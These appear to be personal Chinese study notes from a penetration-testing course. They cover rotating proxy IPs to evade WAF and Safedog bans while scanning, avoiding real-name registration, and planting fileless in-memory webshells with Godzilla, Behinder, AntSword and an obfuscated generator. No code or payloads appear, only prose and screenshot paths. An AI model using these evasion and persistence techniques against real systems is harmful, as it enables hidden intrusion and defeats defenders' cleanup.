主要是一下方法：

1. 物联网卡+移动WIFI设备------会一直换ip
2. 云平台云函数接口调用-----推荐用国外的，不用实名
3. 自建代理池+隧道代理--------推荐使用，需要付费。
4. 机场节点+clash.meta+隧道代理（翻墙）

代理池实战时就买个付费的代理，这节测试就用本地代理池，免费版本的，

11min  快代理产品建立代理池，每次请求都会变ip。

这里以快代理这个产品为例-----隧道代理，每次请求换ip：

![image-20241230181736498](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241230181736498.png)

![image-20241230201345469](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241230201345469.png)

15min 浏览器配置代理，配好后就可以访问ip138，发现每次访问的地址都会变。

![image-20241230201813826](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241230201813826.png)

刷新当前ip，每次刷新都会变：

![image-20241230202045006](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241230202045006.png)



19min 本机cmd配置代理，用代理工具Proxyfier，socks代理。

cmd命令：

![image-20241230202823989](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241230202823989.png)

配置代理工具：

![image-20241230203009853](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241230203009853.png)

![image-20241230203109708](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241230203109708.png)

访问cip.cc，发现ip会一直变：

![image-20241230203623435](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241230203623435.png)

注意：这里因为本地的外网ip一直变化，所以没有办法添加白名单，所以每次用快代理时候都得输入账户密码：

![image-20241230203518722](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241230203518722.png)

![image-20241230203543315](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241230203543315.png)

24min  goby走代理。如果有的工具没有代理，那就用Proxyfier这类代理工具，让我们的测试工具走代理。

![image-20241230204003697](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241230204003697.png)

29min  梯子----clash配置代理，实现相同的功能---每次访问目标时自己的ip都变。适用于小流量测试，大流量时候容易掉线，掉线就叽叽叽，自己原ip就暴露了。

![image-20241230204430280](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241230204430280.png)

这里代理的ip每次访问都一样，得重启工具才能换代理ip，所以这里写规则让他每次请求都会换ip。30min  ，这里没有成功配置，下来有需求在回来看。

代理技术在整个渗透中都能用到，

40min  用waf进行，edr拦截。 让设备告警，没办法，只能魔改自己的webshell工具。

56 min  安全狗：扫网站，直接被拉黑ip。然后就挂代理，继续访问目标网站。

![image-20241230205415350](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241230205415350.png)

然后就挂代理进行扫网站，一直封一直扫，一直换ip。先用御剑进行目录扫描、一开扫就被封了：

![image-20241230210153181](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241230210153181.png)

挂上代理后就不会被封，封一个换一个、换比封的快：

![image-20241230210240152](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241230210240152.png)

![image-20241230210444865](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241230210444865.png)

日志记录：

![image-20241230210406688](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241230210406688.png)

挂上代理后的日志、可以看出来，封一个换一个ip接着扫：

![image-20241230210524121](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20241230210524121.png)

1h10min：演示，用工具扫网站，观察目标服务器上的安全狗拦截。这里注意：代理只是换个通讯，并不能换你的攻击流量，比如有的攻击能够拦截你的攻击流量，那么你就算换ip通讯也不行。

和上面一样，还是扫后被封ip，然后需要挂代理，可以选择你扫目标用的exe，给exe用上代理。

# 内存马

普通的webshell的马比较容易查杀，被蓝队发现，所以引入内存马。PHP,Java,Python,ASPX等

内存马：无文件webshell。

10min  写php  内存马      类似金刚狼，删了又可以自己恢复。  蓝队就是结束进程，在删除。用php写的程序一直占用进程，执行写文件的功能，所以就算删除他也会重新生成一个。

![image-20250101205747508](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20250101205747508.png)

17min aspx-----.net文件：（推荐蚁剑）工具植入，传统webshell文件上传后一删除，就连接不上目标了。冰鞋和哥斯拉对aspx的内存马植入不合适，哥斯拉植入后没法利用，冰鞋是有的网页解析不了上传的aspx内存马。所以推荐蚁剑，先引入插件as-exploit，蚁剑后门还在另一个目录下存着。

###### 哥斯拉：

<img src="E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20250101211024678.png" alt="image-20250101211024678" style="zoom: 67%;" />

拿到后植入内存马后不知道如何利用，succesfully后没有利用的了：

![image-20250101211332421](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20250101211332421.png)

###### 冰蝎

冰蝎，这里因为对两个aspx和asp后门解析不了，所以拿不到webshell：

![image-20250101213825315](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20250101213825315.png)

反正冰蝎这里是这样注入内存马，但是冰蝎并不擅长内存马，aspx的内存马植入：

![image-20250101213652404](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20250101213652404.png)

###### 蚁剑

24min 蚁剑连接目标，用下载的蚁剑上的插件植入内存马，植入后在目标机上的目录下是没有植入的内存马，植入的是程序，不在磁盘上。---------需要As-Exploits的插件。

![image-20250101214848214](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20250101214848214.png)

这里需注意，蚁剑的后门在AwesomeScript-master目录里存着：

![image-20250101215553585](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20250101215553585.png)

连接：

![image-20250101215804254](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20250101215804254.png)

用As插件后可以查看当前已经植入的内存马和植入内存马：

![image-20250101220136172](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20250101220136172.png)

植入内存马：

![image-20250101220254458](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20250101220254458.png)

![image-20250101220629659](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20250101220629659.png)

内存马测试连接,因为是用aspx拿的webshell，所以内存马的尾缀也为aspx：

![image-20250101221234883](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20250101221234883.png)

然后这里目标磁盘上也没有写入的xdsec   的webshell文件：

![image-20250101221904218](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20250101221904218.png)

##### java靶场

33min  搭建java环境：

搭建失败，所以无法显示下来的：

![image-20250104193229976](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20250104193229976.png)

36min  演示，哥斯拉植入java内存马，蚁剑还可以看是否被植入内存马。

哥斯拉先上传后门拿到shell后再植入内存马，然后通过内存马路径成功连接：

![image-20250104200440633](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20250104200440633.png)

查看对应的目录：

![image-20250104200732867](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20250104200732867.png)

![image-20250104201321019](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20250104201321019.png)

###### 2

这里蚁剑也可以：和上面演示一样

![image-20250104201904125](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20250104201904125.png)

###### 工具

48min 工具植入的缺陷：哥斯拉 冰鞋 蚁剑      先上传后门在用常规后门加载内存马功能，在配置内存马信息（路径、密码）                  那么这里的，刚开始上传的后门就容易被发现，所以考虑能不能直接植入内存马，

55min  所以就考虑直接植入内存马  generator （jMG-gui-obf-1.0.8.jar）   可以生成许多工具的内存马   59min  生成内存马，这里连接时候注意和内存马的生成时候配置信息要对应，然后用Webshell工具一连接就触发内存马了（内存马就不见了）

生成内存马文件：

![image-20250104202907113](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20250104202907113.png)

因为里面是有混淆加密过的：

![image-20250104203002824](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20250104203002824.png)

将生成的内存马文件上传到目标目录下、连接内存马，这里就算发现内存马文件，然后删除文件还是可以连接上：

![image-20250104203755200](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20250104203755200.png)

 1h 10min   哥斯拉小翻车          当然，这款工具生成的时候肯定是中间件框架要和目标对应。

当前环境应该是不支持linsten监听器：

**![image-20250104204427397](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20250104204427397.png)**

换成Filter监听器就支持：

![image-20250104204531549](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20250104204531549.png)

1h16min python 网站-----植入python内存马，写入py代码执行命令。

![image-20250104205308368](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20250104205308368.png)

![image-20250104205802940](E:\新建文件夹\新建文件夹\typora学习笔记软件\缓存\image-20250104205802940.png)

shiro梭哈工具上也有植入内存马的功能。

1h23min  内存马学习资料。

